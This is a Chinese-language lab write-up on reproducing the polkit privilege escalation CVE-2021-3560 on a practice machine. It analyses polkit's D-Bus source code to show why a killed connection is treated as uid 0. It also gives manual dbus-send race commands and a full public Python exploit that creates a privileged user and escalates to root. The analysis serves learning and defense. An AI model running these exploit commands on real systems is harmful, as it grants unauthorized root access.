Cap虽然已经拿到root flag，但还是有一个遗留的问题，那就是`CVE-2021-3560`

因为vulhub上并没有这个CVE漏洞的环境，我们接着用这台机器复现这个漏洞。

要想理解这个漏洞，就要从linux的DBUS讲起。

D-BUS是一套linux中的IPC机制，和信号作用一样。信号更底层更原始，是内核级中的。它也十分简单，所有信号的含义都是预定好的。

比较好的解释D-BUS的文章：https://zhuanlan.zhihu.com/p/1380571708

了解明白D-BUS的原理后，再看这个漏洞就比较容易理解了：https://www.freebuf.com/vuls/281081.html

注意Polkit是一个授权框架，pkexec则是polkit服务的命令行工具。

pkexec从作用来说相当于`sudo`

漏洞总结就是polkit向总线查询uid（和pid），如果总线返回的uid为0，那么polkit会立刻授权。如果不为0，就发送允许授权请求的列表到认证客户端。客户端打开一个窗口获取用户输入密码，发送给polkit。

而我们在polkit查询uid时断开连接，连接不存在主线返回错误，但是polkit没有正确处理错误拒绝授权，反而将该连接视为UID为0的进程并且授权。

```
  user_of_subject = polkit_backend_session_monitor_get_user_for_subject (priv->session_monitor,
                                                                         subject, NULL,
                                                                         error);
  if (user_of_subject == NULL) // false
      goto out;

  /* special case: uid 0, root, is _always_ authorized for anything */
  if (identity_is_root_user (user_of_subject)) // true
    {
      result = polkit_authorization_result_new (TRUE, FALSE, NULL); // authorize the caller
      goto out;
    }
```

整理工作逻辑如上。

具体一点就是保存uid，pid的结构被初始化了成0。查询的函数是
```
polkit_system_bus_name_get_creds_sync (PolkitSystemBusName           *system_bus_name,
				       guint32                       *out_uid,
				       guint32                       *out_pid,
				       GCancellable                  *cancellable,
				       GError                       **error)
				       ...
```

这里设置了error参数，但是在后续却没有验证这个参数，直接开始了判断uid是否为0。而uid非常遗憾地被初始化为0。

再具体一点就是

```
AsyncGetBusNameCredsData data = { 0, };#被初始化为0
...
data.error = error;
...
g_dbus_connection_call() * 2 ; #第一个指定的方法是GetConnectionUnixUser,第二个指定的方法是GetConnectionProcessID
...
```

上面的函数参数中有一个回调函数`on_retrieved_unix_uid_pid`,在函数发起连接请求执行结束后自动调用，取回方法结果uid和pid。
而`on_retrieved_unix_uid_pid`则是使用另外一个函数`g_dbus_connection_call_finish`获取调用结果。这样工作的原因是实现异步调用，`g_dbus_connection_call()`发起请求后立刻返回，并不等待结果，而是让自己的"小弟"取回结果。

显然，“小弟”`on_retrieved_unix_uid_pid`又把活交给了"小小弟"`g_dbus_connection_call_finish`:

```
static void
on_retrieved_unix_uid_pid (GObject              *src, // connection
			   GAsyncResult         *res, // Async result object
			   gpointer              user_data) // data paramter passed from previous function
{
  AsyncGetBusNameCredsData *data = user_data;
  GVariant *v;

  v = g_dbus_connection_call_finish ((GDBusConnection*)src, res,
				     data->caught_error ? NULL : data->error); // finish and get the reply
  if (!v) // error ??
    {
      data->caught_error = TRUE;
    }
  else
    {
      guint32 value;
      g_variant_get (v, "(u)", &value); // unpack the reply, get UINT32 (u)
      g_variant_unref (v);
      if (!data->retrieved_uid) // GetConnectionUnixUser method
	{
	  data->retrieved_uid = TRUE;
	  data->uid = value;
	}
      else
	{
	  g_assert (!data->retrieved_pid); // GetConnectionUnixProcessID method
	  data->retrieved_pid = TRUE;
	  data->pid = value;
	}
    }
}
```

问题来了

```
  if (!v) // error ??
    {
      data->caught_error = TRUE;
    }
```

如果连接不存在了，error了，那么设置data->caught_error为True。

而在"大哥"polkit_system_bus_name_get_creds_sync这里：

```
  while (!((data.retrieved_uid && data.retrieved_pid) || data.caught_error)) // wait for the callback function to handle reply
    g_main_context_iteration (tmp_context, TRUE);

  if (out_uid) // TRUE
    *out_uid = data.uid; // set it even if there is an error [!]
  if (out_pid) // FALSE
    *out_pid = data.pid; // set it even if there is an error [!]
  ret = TRUE; // return TRUE even if there is an error [!]
```

只要pid和uid获取到了，或者捕获到错误了，程序就继续运行。

**致命一击**来了，它有处理捕获到错误的情况吗？

没有，不管有没有出错它都设置uid，pid。而它们被初始化为了0。

具体源码分析看：https://github.com/hakivvi/CVE-2021-3560/blob/main/README.md





我们通过`dbus-send`工具向总线发起创建用户的请求，而`CreateUser` 本身是一个需要特权的操作，会向polkit请求授权。

这里的`org.freedesktop.Accounts`是D-BUS独有的命名规范。

```
dbus-send --system--dest=org.freedesktop.Accounts --type=method_call --print-reply/org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:zeeker string:"Zeeker Security"int32:1
```

指令前面加上time，多次测试这个指令执行时间，也就是进程存在时间。我们在进程正常死亡之前，也就是polkit仍在处理请求的过程中杀死进程断开连接来触发漏洞。因此后面加上`& sleep0.xxx s;kill$!` `$!`指最新创建的一个进程，也就是我们发起的这个。

执行可能会失败，多执行几次，直到看到用户创建成功。

这个用户没有密码我们登录不了，因此需要添加密码。使用`SetPasswd`方法，它和`CreateUser` 一样都是一个需要特权的操作，运用同样的方法即可添加成功密码。密码可以用`openssl passwd -5 `生成。

```
dbus-send --system--dest=org.freedesktop.Accounts --type=method_call --print-reply/org/freedesktop/Accounts/User1003 org.freedesktop.Accounts.User.SetPassword string:'$5$.lkCAL3dgdW0pp4L$bA.aAAHBpnlJdDhaSAorFNE4vVKtoU1nGsxFsBNqRb7'string:Whatever & sleep0.006s ; kill$!
```

Poc参考：https://github.com/hakivvi/CVE-2021-3560

https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py

```
import os
import sys
import time
import subprocess
import random
import pwd


print ("**************")
print("Exploit: Privilege escalation with polkit - CVE-2021-3560")
print("Exploit code written by Ahmad Almorabea @almorabea")
print("Original exploit author: Kevin Backhouse ")
print("For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/")
print ("**************")
print("[+] Starting the Exploit ")
time.sleep(3)

check = True
counter = 0
while check:
	counter = counter +1
	process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply','/org/freedesktop/Accounts','org.freedesktop.Accounts.CreateUser','string:ahmed','string:"Ahmad Almorabea','int32:1'])
	try:
    		#print('1 - Running in process', process.pid)
		Random = random.uniform(0.006,0.009)
		process.wait(timeout=Random)
		process.kill()
	except subprocess.TimeoutExpired:
    		#print('Timed out - killing', process.pid)
    		process.kill()

	user = subprocess.run(['id', 'ahmed'], stdout=subprocess.PIPE).stdout.decode('utf-8')
	if user.find("uid") != -1:
		print("[+] User Created with the name of ahmed")
		print("[+] Timed out at: "+str(Random))
		check =False
		break
	if counter > 2000:
		print("[-] Couldn't add the user, try again it may work")
		sys.exit(0)


for i in range(200):
	#print(i)
	uid = "/org/freedesktop/Accounts/User"+str(pwd.getpwnam('ahmed').pw_uid)

	#In case you need to put a password un-comment the code below and put your password after string:yourpassword'
	password = "string:"
	#res = subprocess.run(['openssl', 'passwd','-5',password], stdout=subprocess.PIPE).stdout.decode('utf-8')
	#password = f"string:{res.rstrip()}"

	process = subprocess.Popen(['dbus-send','--system','--dest=org.freedesktop.Accounts','--type=method_call','--print-reply',uid,'org.freedesktop.Accounts.User.SetPassword',password,'string:GoldenEye'])
	try:
    		#print('1 - Running in process', process.pid)
    		Random = random.uniform(0.006,0.009)
    		process.wait(timeout=Random)
    		process.kill()
	except subprocess.TimeoutExpired:
    		#print('Timed out - killing', process.pid)
    		process.kill()

print("[+] Timed out at: " + str(Random))
print("[+] Exploit Completed, Your new user is 'Ahmed' just log into it like, 'su ahmed', and then 'sudo su' to root ")

p = subprocess.call("(su ahmed -c 'sudo su')", shell=True)
```

选取其中python版本阅读。其实逻辑和手操一样，先发起创建请求，然后wait()一个random时间，时间一到就直接kill。id查询是否创建成功，没成功就循环上面操作。成功就继续添加密码，操作和创建用户一样。最后切换到创建的特权用户即可。注意这里创建的用户是一个特权用户，最后还需要`sudo su`才能切到root。

所以这个漏洞本身利用竞争：

```
正常流程：    请求 → 权限检查 → 执行操作
漏洞利用：    请求 → 权限检查 ╳ 终止进程 → 执行操作（跳过检查）
                     ↑
                在这个时间点终止
```